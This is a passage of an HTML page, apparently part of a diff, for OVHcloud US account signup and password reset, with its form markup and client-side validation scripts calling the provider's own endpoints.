+                                        <input aria-labelledby="create-account-email-label" type="text" class="ovh-field-input" id="create-account-email" name="create-account-email" required="required" value=""/>
+                                        <div id="create-account-email-label" class="ovh-field-label">Email address</div>
+                                    </div>
+                                    <div class="ovh-field-error" id="create-account-email-error">This email address could not be used. Please check your email address and try again.</div>
+                                </div>
+                                <div>
+                                    <div class="ovh-field" style="display: flex; align-items: center;">
+                                        <input aria-labelledby="create-account-password-label" type="password" class="ovh-field-input" id="create-account-password" type="password" name="create-account-password" required="required" autocomplete="new-password"/>
+                                        <svg id="create-account-password-show" xmlns="http://www.w3.org/2000/svg" style="cursor: pointer; padding-right: 5px; flex-shrink: 0;" width="20" height="20" viewBox="0 0 24 24">
+                                            <path fill-rule="evenodd" d="M19.778 4.222c.39.39.32 1.094-.157 1.571L5.793 19.621c-.477.477-1.18.548-1.571.157-.39-.39-.32-1.094.157-1.571L18.207 4.379c.477-.477 1.18-.548 1.571-.157zm-3.319 5.947l2.81-2.812a13.098 13.098 0 0 1 3.38 3.486 2.124 2.124 0 0 1-.004 2.32c-2.245 3.39-5.866 5.495-9.815 5.78-.181.022-.364.04-.55.05l-.279.008-.02-.001a6.747 6.747 0 0 1-.796-.055 12.719 12.719 0 0 1-2.943-.56l1.815-1.814A4.602 4.602 0 0 0 12 17l.013-.001c2.632-.006 4.778-2.234 4.778-5a5.18 5.18 0 0 0-.331-1.83l2.81-2.812zm-4.463-5.17h.011c.006 0 .011.003.017.003.271 0 .537.022.8.055.895.063 1.774.22 2.624.466l-1.786 1.786a4.595 4.595 0 0 0-1.37-.3l-.29-.01c-2.638.002-4.79 2.232-4.79 5a5.2 5.2 0 0 0 .227 1.531l-2.946 2.947a13.116 13.116 0 0 1-3.15-3.32 2.128 2.128 0 0 1 .003-2.32c2.252-3.4 5.887-5.506 9.84-5.782.261-.032.525-.053.795-.054h.008L12.007 5zM5.883 8.982a11.161 11.161 0 0 0-2.866 2.955c-.023.037-.023.092-.003.123a11.177 11.177 0 0 0 2.87 2.96 7.139 7.139 0 0 1-.673-3.02c0-1.08.246-2.102.672-3.018zm12.241.01a7.134 7.134 0 0 1 0 6.018 11.154 11.154 0 0 0 2.85-2.944.125.125 0 0 0 .004-.124 11.17 11.17 0 0 0-2.854-2.95z" fill="#0050D7"></path>
+                                        </svg>
+                                        <svg id="create-account-password-show-open" style="display: none; cursor: pointer; padding-right: 5px; flex-shrink: 0;" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24">
+                                            <path fill-rule="evenodd" d="M12.016 5c.28.003.545.024.808.057 3.946.28 7.573 2.385 9.825 5.786a2.124 2.124 0 0 1-.004 2.32c-2.245 3.39-5.866 5.495-9.815 5.78a6.657 6.657 0 0 1-.829.058h-.012a6.87 6.87 0 0 1-.804-.056c-3.952-.276-7.587-2.382-9.843-5.787a2.128 2.128 0 0 1 .004-2.321c2.252-3.4 5.887-5.506 9.84-5.782.261-.032.525-.053.795-.054h.035zm-.014 2c-2.638 0-4.79 2.23-4.79 5 0 2.769 2.151 4.999 4.787 5l.013-.001c2.632-.006 4.778-2.234 4.778-5 0-2.768-2.152-4.998-4.788-5zM5.883 8.98a11.161 11.161 0 0 0-2.866 2.956c-.023.037-.023.092-.003.123a11.177 11.177 0 0 0 2.87 2.96 7.139 7.139 0 0 1-.673-3.02c0-1.08.246-2.102.672-3.018zm12.241.012a7.134 7.134 0 0 1 0 6.017 11.154 11.154 0 0 0 2.85-2.944.125.125 0 0 0 .004-.124 11.17 11.17 0 0 0-2.854-2.95zm-6.028.826a1.658 1.658 0 0 0-.095.545c0 .904.707 1.637 1.579 1.637.179 0 .358-.035.526-.099v.1c0 1.204-.942 2.181-2.105 2.181S9.896 13.205 9.896 12s.942-2.182 2.105-2.182z" fill="#0050D7"/>
+                                        </svg>
+                                        <script nonce="28262855-affe-4b84-84f8-f2fe13d5515a">
+                                            const createAccountPasswordField = document.getElementById('create-account-password');
+                                            const createAccountPasswordShowEyeClosed = document.getElementById('create-account-password-show');
+                                            const createAccountPasswordShowEyeOpen = document.getElementById('create-account-password-show-open');
+    
+                                            createAccountPasswordShowEyeClosed.addEventListener("click", () => {
+                                                createAccountPasswordField.type = 'text';
+                                                createAccountPasswordShowEyeOpen.style.display = 'block';
+                                                createAccountPasswordShowEyeClosed.style.display = 'none';
+                                            });
+                                            createAccountPasswordShowEyeOpen.addEventListener("click", () => {
+                                                createAccountPasswordField.type = 'password';
+                                                createAccountPasswordShowEyeOpen.style.display = 'none';
+                                                createAccountPasswordShowEyeClosed.style.display = 'block';
+                                            });
+                                        </script>
+                                        <div id="create-account-password-label" class="ovh-field-label">Password</div>
+                                    </div>
+                                    <div class="ovh-field-error" id="create-account-password-error">This password is too easy to guess and could not be used. Please change your password and try again.</div>
+                                    <div>
+                                        <meter id="create-account-password-meter" class="password-meter" max="4"/>
+                                    </div>
+                                </div>
+                                <div class="ovh-checkbox">
+                                    <label for="accept_terms">
+                                    I confirm that I am at least 18 years old and accept the <a href="https://storage.us-east-va.cloud.ovh.us/v1/AUTH_a62e25e041674befa3dafae685761c2c/contracts/cec0b7a-tos-US-6.0.pdf" target="_blank" rel="noopener">Terms of Service</a> and <a href="https://us.ovhcloud.com/legal/privacy-policy/" target="_blank" rel="noopener">Privacy Policy</a>
+                                        <input type="checkbox" required="required" id="accept_terms" name="create-account-terms">
+                                        <span class="checkmark"></span>
+                                    </label>
+                                </div>
+                                <input type="hidden" id="accept_emailing" name="create-account-accept-emailing" value="on"/>
+                                <div>
+                                    <button id="create-account-submit" type="submit" class="btn btn-secondary">Create an account</button>
+                                </div>
+                            </form>
+                            <script nonce="28262855-affe-4b84-84f8-f2fe13d5515a">
+                                
+                                function validateEmail(field) {
+                                    
+                                    if (field.value === '') {
+                                        return;
+                                    }
+
+                                    
+                                    if (!field.value.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
+                                        field.parentElement.classList.add('ovh-field-set-invalid');
+                                        field.setCustomValidity("This email address could not be used. Please check your email address and try again.");
+                                        document.getElementById("create-account-email-error").style.display = "block";
+                                        return;
+                                    }
+
+                                    
+                                    fetch('\/auth\/signup\/api/isValidEmail', {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json; charset=UTF-8' },
+                                        body: JSON.stringify({ "company": "OVH", "email": field.value })
+                                    })
+                                    .then(res => res.json())
+                                    .then(res => {
+                                        if (res.available === false) {
+                                            field.parentElement.classList.add('ovh-field-set-invalid');
+                                            field.setCustomValidity("This email address could not be used. Please check your email address and try again.");
+                                            document.getElementById("create-account-email-error").style.display = "block";
+                                        }
+                                    });
+                                }
+
+                                validateEmail(document.getElementById("create-account-email"));
+                                document.getElementById("create-account-email").addEventListener("focusin", (e) => {
+                                    document.getElementById("create-account-email-error").style.display = "none";
+                                    e.target.parentElement.classList.remove('ovh-field-set-invalid');
+                                    e.target.setCustomValidity('');
+                                });
+                                document.getElementById("create-account-email").addEventListener("focusout", (e) => {
+                                    validateEmail(e.target);
+                                });
+
+                                
+                                document.getElementById("create-account-password").addEventListener("input", (e) => {
+                                    let score = 0;
+                                    const value = e.target.value;
+                                    if (value !== "") {
+                                        const result = zxcvbn(value);
+                                        if (result.score === 0) {
+                                            score = 1;
+                                        } else {
+                                            score = result.score;
+                                        }
+                                    }
+                                    document.getElementById("create-account-password-meter").value = score;
+                                });
+                                document.getElementById("create-account-password").addEventListener("focusin", (e) => {
+                                    document.getElementById("create-account-password-error").style.display = "none";
+                                    e.target.parentElement.classList.remove('ovh-field-set-invalid');
+                                    e.target.setCustomValidity('');
+                                });
+                                document.getElementById("create-account-password").addEventListener("focusout", (e) => {
+                                    const value = e.target.value;
+
+                                    
+                                    if (value === '') {
+                                        return;
+                                    }
+
+                                    
+                                    if (zxcvbn(value).score < 3) {
+                                        e.target.parentElement.classList.add('ovh-field-set-invalid');
+                                        e.target.setCustomValidity("This password is too easy to guess and could not be used. Please change your password and try again.");
+                                        document.getElementById("create-account-password-error").style.display = "block";
+                                        return;
+                                    }
+
+                                    
+                                    fetch('\/auth\/signup\/api/checkPassword', {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json; charset=UTF-8' },
+                                        body: JSON.stringify({ "password": e.target.value })
+                                    })
+                                    .then(res => res.json())
+                                    .then(res => {
+                                        if (res.valid === false) {
+                                            e.target.parentElement.classList.add('ovh-field-set-invalid');
+                                            e.target.setCustomValidity("This password is too easy to guess and could not be used. Please change your password and try again.");
+                                            document.getElementById("create-account-password-error").style.display = "block";
+                                            document.getElementById("create-account-password-meter").value = 1;
+                                        }
+                                    });
+                                });
+                            </script>
+                        </div>
+                    </div>
+                    <div class="rgpd-info">
+                    </div>
+                </div>
+                <div id="forgot-password" class="forgot-password-panel">
+                    <div style="width: 96px; height: 96px; background-color: #eff9fd; border-radius: 50%; margin-left: auto; margin-right: auto;">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="46" height="46" viewBox="0 0 32 32" style="margin-top: 25px; margin-left: 25px;">
+                            <path fill="#0050D7" fill-rule="evenodd" d="M16 0a8 8 0 0 1 8 8v4h3.5a1.5 1.5 0 0 1 1.5 1.5v17a1.5 1.5 0 0 1-1.5 1.5h-23A1.5 1.5 0 0 1 3 30.5v-17A1.5 1.5 0 0 1 4.5 12H8V8a8 8 0 0 1 8-8zm11.5 13h-23a.5.5 0 0 0-.5.5v17a.5.5 0 0 0 .5.5h23a.5.5 0 0 0 .5-.5v-17a.5.5 0 0 0-.5-.5zM16 19a2 2 0 0 1 1.001 3.732L17 25a1 1 0 0 1-2 0v-2.268A2 2 0 0 1 16 19zm0-18a7 7 0 0 0-7 7v4h14V8a7 7 0 0 0-7-7z"/>
+                        </svg>
+                    </div>
+
+                    <div class="forgot-password-title">Reset your password</div>
+
+                    <form id="forgot-password-form" autocomplete="off" style="display: contents;">
+                        <div class="ovh-field">
+                            <input type="text" class="ovh-field-input" id="lost-account" name="account" autofocus="true" required="required"/>
+                            <div class="ovh-field-label">Account ID or email address</div>
+                        </div>
+                        <div style="display: flex; justify-content: center;">
+                            <button id="forgot-password-submit" type="submit" class="btn btn-primary">Submit</button>
+                        </div>
+                    </form>
+                    <div class="forgot-password-back">
+                        <a href="#" id="forgot-password-back-button">Back</a>
+                    </div>
+                    <div id="forgot-password-loader" class="forgot-password-loader">
+                        Checking...
+                    </div>
+                    <div id="forgot-password-failure" class="forgot-password-failure">
+                        Unable to start recovery procedure
+                    </div>
+                    <div id="forgot-password-success" class="forgot-password-success">
+                        Recovery email has been sent
+                    </div>
+                </div>
+                <script nonce="28262855-affe-4b84-84f8-f2fe13d5515a">
+                    const forgotPasswordDiv = document.getElementById("forgot-password")
+                    const forgotPasswordFailure = document.getElementById("forgot-password-failure");
+                    const forgotPasswordLoader = document.getElementById("forgot-password-loader");
+                    const forgotPasswordSuccess = document.getElementById("forgot-password-success");
+                    const loginForm = document.getElementById("login");
+                    const lostAccountField = document.getElementById("lost-account");
+
+                    document.getElementById("forgot-password-button").addEventListener('click', () => {
+                        loginForm.style.display = "none";
+                        forgotPasswordLoader.style.display = "none";
+                        forgotPasswordFailure.style.display = "none";
+                        forgotPasswordSuccess.style.display = "none";
+                        forgotPasswordDiv.style.display = "flex";
+                        lostAccountField.focus();
+                    });
+                    document.getElementById("forgot-password-back-button").addEventListener('click', () => {
+                        forgotPasswordDiv.style.display = "none";
+                        loginForm.style.display = "flex";
+                    });
+                    document.getElementById("forgot-password-form").addEventListener('submit', (evt) => {
+                        evt.preventDefault();
+                        forgotPasswordLoader.style.display = "block";
+                        forgotPasswordFailure.style.display = "none";
+                        forgotPasswordSuccess.style.display = "none";
+
+                        fetch('https://api.us.ovhcloud.com/1.0/me/passwordRecover', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json; charset=UTF-8' },
+                            body: JSON.stringify({ "ovhCompany": "ovh", "ovhId": document.getElementById("lost-account").value })
+                        })
+                        .then(res => {
+                            forgotPasswordLoader.style.display = "none";
+                            if (res.ok) {
+                                forgotPasswordSuccess.style.display = "block";
+                            } else {
+                                forgotPasswordFailure.style.display = "block";
+                            }
+                        })
+                        .catch(err => {
+                            forgotPasswordLoader.style.display = "none";
+                            forgotPasswordFailure.style.display = "block";
+                        })
+                    });
+                </script>
+            </div>
+        </div>
+    </body>
+</html>
+
